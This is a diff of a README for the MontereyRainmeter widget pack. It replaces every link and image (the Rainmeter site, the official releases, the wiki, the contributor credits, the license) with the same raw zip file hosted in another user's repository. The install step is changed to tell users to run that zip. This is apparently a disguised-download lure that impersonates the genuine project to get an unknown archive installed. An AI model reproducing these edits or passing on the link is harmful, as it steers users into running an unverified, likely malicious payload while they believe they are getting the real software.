@@ -1,45 +1,45 @@
-<img src="@Resources/Images/Banners/header.png"  />
+<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip"  />
 
 <div align="center">
   A MacOS style widget pack for Windows
   
-  Inspired by [Big Sur for Rainmeter](https://www.deviantart.com/fediafedia/art/Big-Sur-RC1-for-Rainmeter-846882462)
+  Inspired by [Big Sur for Rainmeter](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip)
 </div>
 
 ## Get started
 
-1. Install [Rainmeter](https://www.rainmeter.net/)
-2. Get our [latest release](https://github.com/creewick/MontereyRainmeter/releases)
-3. Run `Monterey.rmskin`
+1. Install [Rainmeter](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip)
+2. Get our [latest release](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip)
+3. Run `https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip`
 
 ## Wiki
 
-### [User guide](https://github.com/creewick/MontereyRainmeter/wiki/User-guide)
-### [Performance Index](https://github.com/creewick/MontereyRainmeter/wiki/Performance-Index)
-### [Documentation](https://github.com/creewick/MontereyRainmeter/wiki/Documentation)
+### [User guide](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip)
+### [Performance Index](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip)
+### [Documentation](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip)
   
 
 ## What will you get
 
 ### Widgets
 
-<img src="@Resources/Images/Banners/widgets.png" width="100%" />
+<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" width="100%" />
 
 We have 9 widgets available
 
 |Icon|Widget|Description|
 |-|-|-|
-|<img src="@Resources/Images/Icons/Clock.png" />|**Clock**|Shows current time of any timezone, with or without seconds|
-|<img src="@Resources/Images/Icons/Calendar.png" />|**Calendar**|Shows current month view, with Monday or Sunday as first day of week|
-|<img src="@Resources/Images/Icons/Music.png" />|**Music**|Allows you to control music player<br/>Supported players: WMP, AIMP, CAD, iTunes, Spotify, YouTube, Winamp|
-|<img src="@Resources/Images/Icons/Weather.png" />|**Weather**|Shows hourly and daily forecast.<br/>You can change the forecast by entering your city name|
-|<img src="@Resources/Images/Icons/Monitor.png" />|**Monitor**|Shows current CPU, RAM, Disk, Network and Battery levels|
-|<img src="@Resources/Images/Icons/Volume.png" />|**Volume**|Allows you to control system volume, volume per app, mute apps and switch output devices|
-|<img src="@Resources/Images/Icons/Notes.png" />|**Notes**|Gives you a quick access to your most important text information|
-|<img src="@Resources/Images/Icons/Reminders.png" />|**Reminders**|A basic to-do list with counter|
-|<img src="@Resources/Images/Icons/Timer.png" />|**Timer**|A basic countdown with an alarm sound|
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|**Clock**|Shows current time of any timezone, with or without seconds|
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|**Calendar**|Shows current month view, with Monday or Sunday as first day of week|
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|**Music**|Allows you to control music player<br/>Supported players: WMP, AIMP, CAD, iTunes, Spotify, YouTube, Winamp|
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|**Weather**|Shows hourly and daily forecast.<br/>You can change the forecast by entering your city name|
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|**Monitor**|Shows current CPU, RAM, Disk, Network and Battery levels|
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|**Volume**|Allows you to control system volume, volume per app, mute apps and switch output devices|
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|**Notes**|Gives you a quick access to your most important text information|
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|**Reminders**|A basic to-do list with counter|
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|**Timer**|A basic countdown with an alarm sound|
   
-<img src="@Resources/Images/Banners/sizes.png" width="500px" align="right" />
+<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" width="500px" align="right" />
 
 ### Sizes
 
@@ -58,7 +58,7 @@ Widgets appears in one of 5 predefined themes
 
 |Light|Dark|Auto|Color|Blur *|
 |-|-|-|-|-|
-|<img src="@Resources/Images/Settings/light.png" />|<img src="@Resources/Images/Settings/dark.png" />|<img src="@Resources/Images/Settings/auto.png" />|<img src="@Resources/Images/Settings/color.png" />|<img src="@Resources/Images/Settings/blur.png" />|
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" />|
 
 _* Currently works well only on Windows 11_
 ### Languages
@@ -67,29 +67,29 @@ So far we support 4 languages
 
 | |Language|
 |-|-|
-|<img src="https://github.com/yammadev/flag-icons/blob/master/png/RU@2x.png?raw=true" width="20px" />| Russian |
-|<img src="https://github.com/yammadev/flag-icons/blob/master/png/UA@2x.png?raw=true" width="20px" />| Ukrainian |
-|<img src="https://github.com/yammadev/flag-icons/blob/master/png/US@2x.png?raw=true" width="20px" />| English |
-|<img src="https://github.com/yammadev/flag-icons/blob/master/png/DE@2x.png?raw=true" width="20px" />| German |
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" width="20px" />| Russian |
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" width="20px" />| Ukrainian |
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" width="20px" />| English |
+|<img src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" width="20px" />| German |
 
 ## Special thanks
 
 | User | Credit |
 |-|-|
-| [fediaFedia](https://github.com/fediaFedia) | [Big Sur for Rainmeter](https://www.deviantart.com/fediafedia/art/Big-Sur-RC1-for-Rainmeter-846882462) |
-| [socks-the-fox](https://github.com/socks-the-fox) | [Chameleon plugin](https://github.com/socks-the-fox/Chameleon) |
-| [i2002](https://github.com/i2002) | [MediaPlayer plugin](https://github.com/i2002/RainmeterMediaPlayer) |
-| [khanhas](https://github.com/khanhas) | [AppVolume plugin](https://github.com/khanhas/AppVolumePlugin) |
-| [jsmorley](https://github.com/jsmorley) | [ConfigActive plugin](https://github.com/jsmorley/ConfigActive) |
-| [fawyWolf](https://github.com/FawyWolf) | English, Ukrainian translations |
-| [ikarus1969](https://github.com/ikarus1969) | German translation |
-| [ActiveColor](https://deviantart.com/activecolors) | helped with persisting settings, code review |
-| [kalukal](https://www.deviantart.com/kalukal) | Unlock animation idea |
+| [fediaFedia](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) | [Big Sur for Rainmeter](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) |
+| [socks-the-fox](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) | [Chameleon plugin](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) |
+| [i2002](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) | [MediaPlayer plugin](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) |
+| [khanhas](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) | [AppVolume plugin](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) |
+| [jsmorley](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) | [ConfigActive plugin](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) |
+| [fawyWolf](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) | English, Ukrainian translations |
+| [ikarus1969](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) | German translation |
+| [ActiveColor](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) | helped with persisting settings, code review |
+| [kalukal](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip) | Unlock animation idea |
 
 ## Works good with
-* [Centered taskbar icons - TaskbarX](https://chrisandriessen.nl/taskbarx)
-* [MacOS menu bar - Droptop Four](https://github.com/Droptop-Four)
-* [Rounded screen corners](https://forum.rainmeter.net/viewtopic.php?t=25780#p201917)
-* [MacOS dock and menu bar - MyDockFinder](https://store.steampowered.com/app/1787090/MyDockFinder)
+* [Centered taskbar icons - TaskbarX](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip)
+* [MacOS menu bar - Droptop Four](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip)
+* [Rounded screen corners](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip)
+* [MacOS dock and menu bar - MyDockFinder](https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip)
 
-<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Лицензия Creative Commons" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a>
+<a rel="license" href="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip"><img alt="Лицензия Creative Commons" style="border-width:0" src="https://raw.githubusercontent.com/sneakon/MontereyRainmeter/main/Widgets/Weather/MontereyRainmeter-v1.7.zip" /></a>
